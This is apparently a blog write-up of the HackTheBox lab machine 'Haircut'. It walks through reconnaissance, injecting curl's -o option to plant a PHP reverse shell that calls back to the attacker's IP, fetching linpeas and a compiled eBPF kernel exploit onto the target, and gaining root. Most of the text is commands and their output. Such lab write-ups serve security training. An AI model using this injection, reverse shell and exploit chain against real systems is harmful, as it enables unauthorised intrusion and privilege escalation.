---
layout: page
title: Haircut
description: Haircut from HackTheBox.
img: 
importance: 3
category: HackTheBox
related_publications: false
---

<div class="row justify-content-sm-center">
    <div class="col-sm-8 mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="assets/img/haircut/logo.png" title="HTB Haircut Logo" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
<h2>Link</h2>
<a href="https://app.hackthebox.com/Popcorn/Haircut">Room Link</a>

<br/>
<h2>Process</h2>

<br/>
Time for a haircut!

Per the usual, start off with a nmap scan to get all of the open ports.

{% raw %}
```sh
┌──(kali㉿kali)-[~/Documents/htb/haircut]
└─$ sudo nmap -sC -sV -A -O -oN nmap 10.10.10.24                    
[sudo] password for kali: 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-19 18:51 AEDT
Nmap scan report for 10.10.10.24
Host is up (0.0089s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e9:75:c1:e4:b3:63:3c:93:f2:c6:18:08:36:48:ce:36 (RSA)
|   256 87:00:ab:a9:8f:6f:4b:ba:fb:c6:7a:55:a8:60:b2:68 (ECDSA)
|_  256 b6:1b:5c:a9:26:5c:dc:61:b7:75:90:6c:88:51:6e:54 (ED25519)
80/tcp open  http    nginx 1.10.0 (Ubuntu)
|_http-title:  HTB Hairdresser 
|_http-server-header: nginx/1.10.0 (Ubuntu)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.14, Linux 3.8 - 3.16
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 143/tcp)
HOP RTT      ADDRESS
1   59.53 ms 10.10.16.1
2   10.14 ms 10.10.10.24

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.75 seconds
```
{% endraw %}

<br />
Run nmap against all the ports to look for any weird ports that are open.

{% raw %}
```sh
┌──(kali㉿kali)-[~/Documents/htb/haircut]
└─$ sudo nmap -sS -p- -oN nmapfull 10.10.10.24                      
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-19 18:53 AEDT
Nmap scan report for 10.10.10.24
Host is up (0.080s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 10.64 seconds
```
{% endraw %}

<br />
Check the landing page and view its source.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/haircut/landing.png" title="Check the Landing Page" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

{% raw %}
```html
view-source:http://10.10.10.24/

<!DOCTYPE html>

<title> HTB Hairdresser </title>

<center> <br><br><br><br>
<img src="bounce.jpg" height="750" width="1200" alt="" />
<center>
```
{% endraw %}

<br />
Run ffuf to brute-force for interesting directories or files.  Look for html or php extensions.

{% raw %}
```sh
┌──(kali㉿kali)-[~/Documents/htb/haircut]
└─$ ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.10.24/FUZZ -fw 11 -e .html,.php

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.10.24/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 :: Extensions       : .html .php 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response words: 11
________________________________________________

uploads                 [Status: 301, Size: 194, Words: 7, Lines: 8, Duration: 13ms]
test.html               [Status: 200, Size: 223, Words: 14, Lines: 7, Duration: 11ms]
exposed.php             [Status: 200, Size: 446, Words: 24, Lines: 20, Duration: 14ms]
:: Progress: [661680/661680] :: Job [1/1] :: 2469 req/sec :: Duration: [0:04:10] :: Errors: 0 ::jpg" height="750" width="1200" alt="" />
<center>
```
{% endraw %}

<br />
Navigate to the exposed.php to see what it is.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/haircut/exposed.png" title="Check the Exposed Page" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Try to run the page functionality.  Looks like a curl command.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/haircut/expotrial.png" title="Exposed Trial Run" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Download the pentestmonkey php reverse shell script.

{% raw %}
```sh
┌──(kali㉿kali)-[~/Documents/htb/haircut]
└─$ wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/refs/heads/master/php-reverse-shell.php -O shell.php
--2025-01-19 19:13:59--  https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/refs/heads/master/php-reverse-shell.php
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.111.133, 2606:50c0:8003::154, 2606:50c0:8002::154, ...
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.111.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 5491 (5.4K) [text/plain]
Saving to: ‘shell.php’

shell.php                                                  100%[========================================================================================================================================>]   5.36K  --.-KB/s    in 0.01s   

2025-01-19 19:14:00 (485 KB/s) - ‘shell.php’ saved [5491/5491]
```
{% endraw %}

<br />
Update the IP address to the HackTheBox VPN IP address.  Update the port that will be used for the attack port.

{% raw %}
```php
<?php
// php-reverse-shell - A Reverse Shell implementation in PHP
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net
//
// This tool may be used for legal purposes only.  Users take full responsibility
// for any actions performed using this tool.  The author accepts no liability
// for damage caused by this tool.  If these terms are not acceptable to you, then
// do not use this tool.

<snip>

set_time_limit (0);
$VERSION = "1.0";
$ip = '10.10.16.3';  // CHANGE THIS
$port = 1234;       // CHANGE THIS
$chunk_size = 443;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

<snip>

?>
```
{% endraw %}

<br />
Start a netcat listener.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/htb/haircut]
└─$ nc -nlvp 1234
listening on [any] 1234 ...
```
{% endraw %}

<br />
Use python to start a web server to serve the ptm reverse shell that was just updated.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/htb/haircut]
└─$ sudo python -m http.server 80             
[sudo] password for kali: 
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```
{% endraw %}

<br />
Fiddle with the command.  I tried injecting a semicolon and double ampersand for injection.  There is some kind of check that those aren't appropriate characters for a url.  I also tried using the -o command to the web root at /var/www/html and got permission denied.  Finally, output to the uploads folder that was discovered in the ffuf.

{% raw %}
```bash
http://10.10.16.3/shell.php -o /var/www/html/uploads/shell.php
```
{% endraw %}
<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/haircut/injectedcurl.png" title="Injected Curl" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Navigate to the shell that was just uploaded in the uploads folder.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/haircut/penshell.png" title="Uploaded Shell" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Check the listener and catch the shell.  Use python to updgrade the shell.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/htb/haircut]
└─$ nc -nlvp 1234
listening on [any] 1234 ...
connect to [10.10.16.3] from (UNKNOWN) [10.10.10.24] 51970
Linux haircut 4.4.0-78-generic #99-Ubuntu SMP Thu Apr 27 15:29:09 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
 09:29:31 up 39 min,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ python3 -c 'import pty; pty.spawn("/bin/bash");'
www-data@haircut:/$ 
```
{% endraw %}

<br />
Get the user.txt flag.

{% raw %}
```bash
www-data@haircut:/home/maria$ cat user.txt
cat user.txt
<redacted>
www-data@haircut:/home/maria$ ifconfig
ifconfig
ens160    Link encap:Ethernet  HWaddr 00:50:56:b9:9a:4c  
          inet addr:10.10.10.24  Bcast:10.10.10.255  Mask:255.255.255.0
          inet6 addr: fe80::250:56ff:feb9:9a4c/64 Scope:Link
          inet6 addr: dead:beef::250:56ff:feb9:9a4c/64 Scope:Global
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:1131333 errors:0 dropped:0 overruns:0 frame:0
          TX packets:1125547 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:190200376 (190.2 MB)  TX bytes:426772575 (426.7 MB)

lo        Link encap:Local Loopback  
          inet addr:127.0.0.1  Mask:255.0.0.0
          inet6 addr: ::1/128 Scope:Host
          UP LOOPBACK RUNNING  MTU:65536  Metric:1
          RX packets:250 errors:0 dropped:0 overruns:0 frame:0
          TX packets:250 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1 
          RX bytes:23525 (23.5 KB)  TX bytes:23525 (23.5 KB)
```
{% endraw %}

<br />
There is another user.txt on the user desktop.  Weird.

{% raw %}
```bash
www-data@haircut:/home/maria/Desktop$ cat user.txt
cat user.txt
 <redacted>
www-data@haircut:/home/maria/Desktop$ ip a
ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: ens160: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 00:50:56:b9:9a:4c brd ff:ff:ff:ff:ff:ff
    inet 10.10.10.24/24 brd 10.10.10.255 scope global ens160
       valid_lft forever preferred_lft forever
    inet6 dead:beef::250:56ff:feb9:9a4c/64 scope global mngtmpaddr dynamic 
       valid_lft 86398sec preferred_lft 14398sec
    inet6 fe80::250:56ff:feb9:9a4c/64 scope link 
       valid_lft forever preferred_lft forever
```
{% endraw %}

<br />
Download linpeas.sh.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/htb/haircut]
└─$ wget https://github.com/peass-ng/PEASS-ng/releases/download/20250113-4426d62e/linpeas.sh                                   
--2025-01-19 19:39:51--  https://github.com/peass-ng/PEASS-ng/releases/download/20250113-4426d62e/linpeas.sh
Resolving github.com (github.com)... 4.237.22.38
Connecting to github.com (github.com)|4.237.22.38|:443... connected.
HTTP request sent, awaiting response... 302 Found
Location: https://objects.githubusercontent.com/github-production-release-asset-2e65be/165548191/a36145da-bdb8-4fba-af77-22dc24ac95e1?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=releaseassetproduction%2F20250119%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20250119T084011Z&X-Amz-Expires=300&X-Amz-Signature=8097f7081f98e18773c8656373f3156aa276b598ea423ca8e1475dd573e5f36a&X-Amz-SignedHeaders=host&response-content-disposition=attachment%3B%20filename%3Dlinpeas.sh&response-content-type=application%2Foctet-stream [following]
--2025-01-19 19:39:51--  https://objects.githubusercontent.com/github-production-release-asset-2e65be/165548191/a36145da-bdb8-4fba-af77-22dc24ac95e1?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=releaseassetproduction%2F20250119%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20250119T084011Z&X-Amz-Expires=300&X-Amz-Signature=8097f7081f98e18773c8656373f3156aa276b598ea423ca8e1475dd573e5f36a&X-Amz-SignedHeaders=host&response-content-disposition=attachment%3B%20filename%3Dlinpeas.sh&response-content-type=application%2Foctet-stream
Resolving objects.githubusercontent.com (objects.githubusercontent.com)... 185.199.109.133, 185.199.111.133, 185.199.108.133, ...
Connecting to objects.githubusercontent.com (objects.githubusercontent.com)|185.199.109.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 830426 (811K) [application/octet-stream]
Saving to: ‘linpeas.sh’

linpeas.sh                                                 100%[========================================================================================================================================>] 810.96K  3.30MB/s    in 0.2s    

2025-01-19 19:39:53 (3.30 MB/s) - ‘linpeas.sh’ saved [830426/830426]
```
{% endraw %}

<br />
Transfer linpeas to the victim machine.

{% raw %}
```bash
www-data@haircut:/home/maria$ cd /dev/shm
cd /dev/shm
www-data@haircut:/dev/shm$ wget http://10.10.16.3:8000/linpeas.sh
wget http://10.10.16.3:8000/linpeas.sh
--2025-01-19 09:40:39--  http://10.10.16.3:8000/linpeas.sh
Connecting to 10.10.16.3:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 830426 (811K) [text/x-sh]
Saving to: 'linpeas.sh'

linpeas.sh          100%[===================>] 810.96K  1.04MB/s    in 0.8s    

2025-01-19 09:40:40 (1.04 MB/s) - 'linpeas.sh' saved [830426/830426]
www-data@haircut:/dev/shm$ chmod +x linpeas.sh
chmod +x linpeas.sh
```
{% endraw %}

<br />
Run the linpeas.sh.  Note the first kernel exploit.

{% raw %}
```bash
www-data@haircut:/dev/shm$ ./linpeas.sh
./linpeas.sh



                            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
                    ▄▄▄▄▄▄▄             ▄▄▄▄▄▄▄▄
             ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄
         ▄▄▄▄     ▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄
         ▄    ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄          ▄▄▄▄▄▄               ▄▄▄▄▄▄ ▄
         ▄▄▄▄▄▄              ▄▄▄▄▄▄▄▄                 ▄▄▄▄ 
         ▄▄                  ▄▄▄ ▄▄▄▄▄                  ▄▄▄
         ▄▄                ▄▄▄▄▄▄▄▄▄▄▄▄                  ▄▄
         ▄            ▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄   ▄▄
         ▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄                                ▄▄▄▄
         ▄▄▄▄▄  ▄▄▄▄▄                       ▄▄▄▄▄▄     ▄▄▄▄
         ▄▄▄▄   ▄▄▄▄▄                       ▄▄▄▄▄      ▄ ▄▄
         ▄▄▄▄▄  ▄▄▄▄▄        ▄▄▄▄▄▄▄        ▄▄▄▄▄     ▄▄▄▄▄
         ▄▄▄▄▄▄  ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄   ▄▄▄▄▄ 
          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄        ▄          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ 
         ▄▄▄▄▄▄▄▄▄▄▄▄▄                       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄                         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
          ▀▀▄▄▄   ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▀▀▀▀▀▀
               ▀▀▀▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▀▀
                     ▀▀▀▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▀▀▀

    /---------------------------------------------------------------------------------\
    |                             Do you like PEASS?                                  |                                                                                                                                                     
    |---------------------------------------------------------------------------------|                                                                                                                                                     
    |         Learn Cloud Hacking       :     https://training.hacktricks.wiki         |                                                                                                                                                    
    |         Follow on Twitter         :     @hacktricks_live                        |                                                                                                                                                     
    |         Respect on HTB            :     SirBroccoli                             |                                                                                                                                                     
    |---------------------------------------------------------------------------------|                                                                                                                                                     
    |                                 Thank you!                                      |                                                                                                                                                     
    \---------------------------------------------------------------------------------/     

    <snip>

    [+] [CVE-2017-16995] eBPF_verifier

   Details: https://ricklarabee.blogspot.com/2018/07/ebpf-and-analysis-of-get-rekt-linux.html
   Exposure: highly probable
   Tags: debian=9.0{kernel:4.9.0-3-amd64},fedora=25|26|27,ubuntu=14.04{kernel:4.4.0-89-generic},[ ubuntu=(16.04|17.04) ]{kernel:4.(8|10).0-(19|28|45)-generic}
   Download URL: https://www.exploit-db.com/download/45010
   Comments: CONFIG_BPF_SYSCALL needs to be set && kernel.unprivileged_bpf_disabled != 1

   <snip>
```
{% endraw %}

<br />
Download the exploit to the current working folder.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/htb/haircut]
└─$ wget https://www.exploit-db.com/raw/45010 -O verify.c
--2025-01-19 19:53:47--  https://www.exploit-db.com/raw/45010
Resolving www.exploit-db.com (www.exploit-db.com)... 192.124.249.13
Connecting to www.exploit-db.com (www.exploit-db.com)|192.124.249.13|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: unspecified [text/plain]
Saving to: ‘verify.c’

verify.c                                                       [  <=>                                                                                                                                    ]  13.41K  53.1KB/s    in 0.3s    

2025-01-19 19:53:48 (53.1 KB/s) - ‘verify.c’ saved [13728]
chmod +x linpeas.sh
```
{% endraw %}

<br />
Compile the exploit.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/htb/haircut]
└─$ gcc verify.c -o verify -static
```
{% endraw %}

<br />
Download the exploit to the current working folder.

{% raw %}
```bash
www-data@haircut:/dev/shm$ wget 10.10.16.3:8000/verify
wget 10.10.16.3:8000/verify
--2025-01-19 09:56:47--  http://10.10.16.3:8000/verify
Connecting to 10.10.16.3:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 797792 (779K) [application/octet-stream]
Saving to: 'verify'

verify              100%[===================>] 779.09K   869KB/s    in 0.9s    

2025-01-19 09:56:48 (869 KB/s) - 'verify' saved [797792/797792]
```
{% endraw %}

<br />
Chmod the exploit to make it executable.

{% raw %}
```bash
www-data@haircut:/dev/shm$ chmod +x verify
chmod +x verify
```
{% endraw %}

<br />
Run the exploit.

{% raw %}
```bash
www-data@haircut:/dev/shm$ ./verify
./verify
[.] 
[.] t(-_-t) exploit for counterfeit grsec kernels such as KSPP and linux-hardened t(-_-t)
[.] 
[.]   ** This vulnerability cannot be exploited at all on authentic grsecurity kernel **
[.] 
[*] creating bpf map
[*] sneaking evil bpf past the verifier
[*] creating socketpair()
[*] attaching bpf backdoor to socket
[*] skbuff => ffff880079957100
[*] Leaking sock struct from ffff88007810f800
[*] Sock->sk_rcvtimeo at offset 472
[*] Cred structure at ffff880077b8d480
[*] UID from cred structure: 33, matches the current: 33
[*] hammering cred structure at ffff880077b8d480
[*] credentials patched, launching shell...
#
```
{% endraw %}

<br />
Run whoami to confirm that we are root.

{% raw %}
```bash
# whoami
whoami
root
```
{% endraw %}

<br />
Get the root.txt flag.

{% raw %}
```bash
# cat /root/root.txt
cat /root/root.txt
<redacted>
# ip a
ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: ens160: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 00:50:56:b9:9a:4c brd ff:ff:ff:ff:ff:ff
    inet 10.10.10.24/24 brd 10.10.10.255 scope global ens160
       valid_lft forever preferred_lft forever
    inet6 dead:beef::250:56ff:feb9:9a4c/64 scope global mngtmpaddr dynamic 
       valid_lft 86395sec preferred_lft 14395sec
    inet6 fe80::250:56ff:feb9:9a4c/64 scope link 
       valid_lft forever preferred_lft forever
```
{% endraw %}

<br />
Look forward to seeing you in the next one.